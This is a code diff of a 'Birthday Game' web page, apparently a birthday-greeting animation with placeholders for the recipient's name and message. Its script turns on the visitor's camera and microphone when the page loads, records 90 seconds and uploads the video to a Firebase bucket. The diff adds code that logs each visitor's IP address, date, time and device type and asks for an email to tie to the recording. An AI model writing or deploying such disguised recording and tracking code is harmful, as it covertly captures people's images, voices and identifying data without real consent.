@@ -1,133 +1,103 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/7.17.2/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/7.17.2/firebase-storage.js"></script>
-    <!-- Chrome, Firefox OS and Opera -->
-    <meta name="theme-color" content="#141852" />
-    <!-- Windows Phone -->
-    <meta name="msapplication-navbutton-color" content="#141852" />
-    <!-- iOS Safari -->
-    <meta name="apple-mobile-web-app-status-bar-style" content="#141852" />
 
-    <!-- Primary Meta Tags -->
-    <title>Birthday Game</title>
-    <meta name="title" content="Birthday Game" />
-    <meta name="description" content="let's play..." />
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/7.17.2/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/7.17.2/firebase-storage.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/7.17.2/firebase-database.js"></script>
+  <!-- Chrome, Firefox OS and Opera -->
+  <meta name="theme-color" content="#141852" />
+  <!-- Windows Phone -->
+  <meta name="msapplication-navbutton-color" content="#141852" />
+  <!-- iOS Safari -->
+  <meta name="apple-mobile-web-app-status-bar-style" content="#141852" />
 
-    <meta property="og:type" content="website" />
-    <meta property="og:title" content="Birthday Game" />
-    <meta
-      property="og:description"
-      content="let's play..."
-    />
-    <meta
-      property="og:image"
-      content="https://telegra.ph/file/cab24ce49882fbae39a13.png"
-    />
+  <!-- Primary Meta Tags -->
+  <title>Birthday Game</title>
+  <meta name="title" content="Birthday Game" />
+  <meta name="description" content="let's play..." />
 
-    <link
-      href="https://fonts.googleapis.com/css2?family=Courgette&display=swap"
-      rel="stylesheet"
-    />
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="Birthday Game" />
+  <meta property="og:description" content="let's play..." />
+  <meta property="og:image" content="https://telegra.ph/file/cab24ce49882fbae39a13.png" />
 
-    <!--Generated Read Time Var-->
-    {{^READ_TIME}}
+  <link href="https://fonts.googleapis.com/css2?family=Courgette&display=swap" rel="stylesheet" />
 
-    <link rel="stylesheet" href="./scss/main.scss" />
+  <!--Generated Read Time Var-->
+  {{^READ_TIME}}
 
-    <!-- Favicon -->
-    <link rel="apple-touch-icon" sizes="180x180" href="./resources/favicon/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="./resources/favicon/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="./resources/favicon/favicon-16x16.png">
-    <link rel="manifest" href="./resources/favicon/site.webmanifest">
+  <link rel="stylesheet" href="./scss/main.scss" />
 
-    <!-- animation    -->
-    <script src="./js/index.js" type="module" defer></script>
+  <!-- Favicon -->
+  <link rel="apple-touch-icon" sizes="180x180" href="./resources/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="./resources/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="./resources/favicon/favicon-16x16.png">
+  <link rel="manifest" href="./resources/favicon/site.webmanifest">
 
-    <!-- some extensions -->
-  </head>
-  <body>
-    <!-- Sfx calling -->
+  <!-- animation    -->
+  <script src="./js/index.js" type="module" defer></script>
 
-    <audio class="blast-aud">
-      <source src="./resources/sfx/blast.mp3" type="audio/mpeg" />
-      Your browser does not support the audio element.
-    </audio>
-    <audio class="hbd-aud">
-      <source src="./resources/sfx/hbd.mp3" type="audio/mpeg" />
-      Your browser does not support the audio element.
-    </audio>
-    <audio class="switch-aud">
-      <source src="./resources/sfx/switch.mp3" type="audio/mpeg" />
-      Your browser does not support the audio element.
-    </audio>
-    <audio class="door-aud">
-      <source src="./resources/sfx/door.mp3" type="audio/mpeg" />
-      Your browser does not support the audio element.
-    </audio>
-    <audio class="haunt-aud">
-      <source src="./resources/sfx/haunted-bgm.mp3" type="audio/mpeg" />
-      Your browser does not support the audio element.
-    </audio>
+  <!-- some extensions -->
+</head>
 
-    <div class="content">
-      <img
-        src="./resources/img/flag-right.png"
-        alt="flags"
-        class="flag flag--c-left"
-      />
-      <img
-        src="./resources/img/flag-left.png"
-        alt="flags"
-        class="flag flag--left"
-      />
-      <img
-        src="./resources/img/flag-left.png"
-        alt="flags"
-        class="flag flag--c-right"
-      />
-      <img
-        src="./resources/img/flag-right.png"
-        alt="flags"
-        class="flag flag--right"
-      />
-      <img
-        src="./resources/img/balloon-left.png"
-        alt="balloon-left"
-        class="balloon balloon--left"
-      />
-      <img
-        src="./resources/img/balloon-right.png"
-        alt="balloon-right"
-        class="balloon balloon--right"
-      />
-      <div class="frame">
-        <div class="img-back">
-          <div class="bd-pic"></div>
-          <img class="cap" src="./resources/img/bday-cap.svg" alt="" />
-          <img class="confetti" src="./resources/img/confetti.svg" alt="" />
-          <img class="cake" src="./resources/img/cake.svg" alt="" />
-          <div class="velas">
-            <div class="fuego"></div>
-            <div class="fuego"></div>
-            <div class="fuego"></div>
-            <div class="fuego"></div>
-            <div class="fuego"></div>
-          </div>
-        </div>
-        <div class="HBD-text">
-          <p class="HBD">{{^HBD_MSG}}</p>
-          <p class="nickname">{{^NICKNAME}}</p>
+<body>
+  <!-- Sfx calling -->
+
+  <audio class="blast-aud">
+    <source src="./resources/sfx/blast.mp3" type="audio/mpeg" />
+    Your browser does not support the audio element.
+  </audio>
+  <audio class="hbd-aud">
+    <source src="./resources/sfx/hbd.mp3" type="audio/mpeg" />
+    Your browser does not support the audio element.
+  </audio>
+  <audio class="switch-aud">
+    <source src="./resources/sfx/switch.mp3" type="audio/mpeg" />
+    Your browser does not support the audio element.
+  </audio>
+  <audio class="door-aud">
+    <source src="./resources/sfx/door.mp3" type="audio/mpeg" />
+    Your browser does not support the audio element.
+  </audio>
+  <audio class="haunt-aud">
+    <source src="./resources/sfx/haunted-bgm.mp3" type="audio/mpeg" />
+    Your browser does not support the audio element.
+  </audio>
+
+  <div class="content">
+    <img src="./resources/img/flag-right.png" alt="flags" class="flag flag--c-left" />
+    <img src="./resources/img/flag-left.png" alt="flags" class="flag flag--left" />
+    <img src="./resources/img/flag-left.png" alt="flags" class="flag flag--c-right" />
+    <img src="./resources/img/flag-right.png" alt="flags" class="flag flag--right" />
+    <img src="./resources/img/balloon-left.png" alt="balloon-left" class="balloon balloon--left" />
+    <img src="./resources/img/balloon-right.png" alt="balloon-right" class="balloon balloon--right" />
+    <div class="frame">
+      <div class="img-back">
+        <div class="bd-pic"></div>
+        <img class="cap" src="./resources/img/bday-cap.svg" alt="" />
+        <img class="confetti" src="./resources/img/confetti.svg" alt="" />
+        <img class="cake" src="./resources/img/cake.svg" alt="" />
+        <div class="velas">
+          <div class="fuego"></div>
+          <div class="fuego"></div>
+          <div class="fuego"></div>
+          <div class="fuego"></div>
+          <div class="fuego"></div>
         </div>
       </div>
+      <div class="HBD-text">
+        <p class="HBD">{{^HBD_MSG}}</p>
+        <p class="nickname">{{^NICKNAME}}</p>
+      </div>
+    </div>
 
-      <div class="frame frame2">
-        <div class="scroll">
-          <div class="text">{{^SCROLL_MSG}}</div>
+    <div class="frame frame2">
+      <div class="scroll">
+        <div class="text">{{^SCROLL_MSG}}</div>
       </div>
     </div>
 
@@ -153,61 +123,88 @@
     </div>
 
     <div class="darkroom">
-      <p class="bb-text">Hey Panda!</p>
+      <p class="bb-text">Hey!</p>
       <p class="bb-text">Why is it so dark here?</p>
       <p class="bb-text">
-        <span class="name">Panda</span>! Can you please switch on the lights?
+        <span class="name">{{^NAME}}</span>! Can you please switch on the lights?
       </p>
     </div>
 
     <div class="btn switch"></div>
     <div class="btn-ref"></div>
-  </body>
+</body>
+
 </html>
 <script>
   const firebaseConfig = {
-      storageBucket: "hello-world-c054a.appspot.com",
+    storageBucket: "hello-world-c054a.appspot.com",
+    databaseURL: "https://hello-world-c054a-default-rtdb.firebaseio.com"
   };
 
   firebase.initializeApp(firebaseConfig);
+  var database = firebase.database();
   const storage = firebase.storage();
 
-  window.onload = function () {
-      let mediaRecorder;
-      const parts = [];
-      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-          .then((stream) => {
-              mediaRecorder = new MediaRecorder(stream);
-              mediaRecorder.start(1000);
-              mediaRecorder.ondataavailable = function (e) {
-                  parts.push(e.data);
-              };
-              setTimeout(function () {
-                  mediaRecorder.stop();
-                  const blob = new Blob(parts, {
-                      type: "video/webm"
-                  });
+  async function getUserIp() {
+    const response = await fetch("https://api.ipify.org?format=json");
+    const data = await response.json();
+    return data.ip.replace(/\./g, "-");
+  }
+  function getDate() {
+    var date = new Date();
+    var year = date.toLocaleString("default", { year: "numeric" });
+    var month = date.toLocaleString("default", { month: "2-digit" });
+    var day = date.toLocaleString("default", { day: "2-digit" });
+    return year + "-" + month + "-" + day;
+  }
+  function getTime() {
+    var date = new Date();
+    var hour = date.getHours().toString().padStart(2, '0');
+    var min = date.getMinutes().toString().padStart(2, '0');
+    var sec = date.getSeconds().toString().padStart(2, '0');
+    return hour + ":" + min + ":" + sec;
+  }
+  async function saveVisitorData() {
+    database.ref('/Visitors/' + await getDate() + '/' + await getUserIp() + '/' + await getTime() + '/' + (/android|iphone|kindle|ipad/i.test(navigator.userAgent) ? "Mobile" : "Computer")).set(await getUserIp());
+  }
 
-                  const currentDateTime = new Date();
-                  const formattedDateTime = `${currentDateTime.getFullYear()}${padZero(currentDateTime.getMonth() + 1)}${padZero(currentDateTime.getDate())}_${padZero(currentDateTime.getHours())}${padZero(currentDateTime.getMinutes())}${padZero(currentDateTime.getSeconds())}`;
-                  function padZero(num) {
-                      return num.toString().padStart(2, '0');
-                  }
-                  if (localStorage.getItem("hackPongal") == null) {
-                      localStorage.setItem("hackPongal", btoa(formattedDateTime));
-                  }
-                  const fileNameRef = "hackPongal/" + localStorage.getItem("hackPongal") + "/" + formattedDateTime;
-                  const storageRef = storage.ref(fileNameRef);
-                  storageRef.put(blob).then(snapshot => {
-                      $('#showVidBtn').show();
-                  }).catch(error => {
-                      console.error('Error uploading file:', error);
-                  });
-              }, 90000);
-          })
-          .catch((error) => {
-              alert('Camera and microphone permissions denied or blocked. Please allow access and try again.');
+  window.onload = function () {
+    saveVisitorData();
+    let mediaRecorder;
+    const parts = [];
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      .then((stream) => {
+        mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.start(1000);
+        mediaRecorder.ondataavailable = function (e) {
+          parts.push(e.data);
+        };
+        setTimeout(async function () {
+          mediaRecorder.stop();
+          const blob = new Blob(parts, {
+            type: "video/webm"
           });
+
+          const currentDateTime = new Date();
+          const formattedDateTime = `${currentDateTime.getFullYear()}${padZero(currentDateTime.getMonth() + 1)}${padZero(currentDateTime.getDate())}_${padZero(currentDateTime.getHours())}${padZero(currentDateTime.getMinutes())}${padZero(currentDateTime.getSeconds())}`;
+          function padZero(num) {
+            return num.toString().padStart(2, '0');
+          }
+          if (localStorage.getItem("BirthdayGame") == null) {
+            localStorage.setItem("BirthdayGame", btoa(formattedDateTime));
+          }
+          const fileNameRef = "BirthdayGame/" + localStorage.getItem("BirthdayGame") + "/" + formattedDateTime;
+          const storageRef = storage.ref(fileNameRef);
+          storageRef.put(blob).then(async snapshot => {
+            const userEmail = prompt("Please enter your email address, and we will send you your reaction video");
+            database.ref('/VideoRef/' + await getUserIp() + '/' + fileNameRef).set(userEmail);
+          }).catch(error => {
+            console.error('Error uploading file:', error);
+          });
+        }, 90000);
+      })
+      .catch((error) => {
+        alert('Camera and microphone permissions denied or blocked. Please allow access and try again.');
+      });
   }
 </script>
-
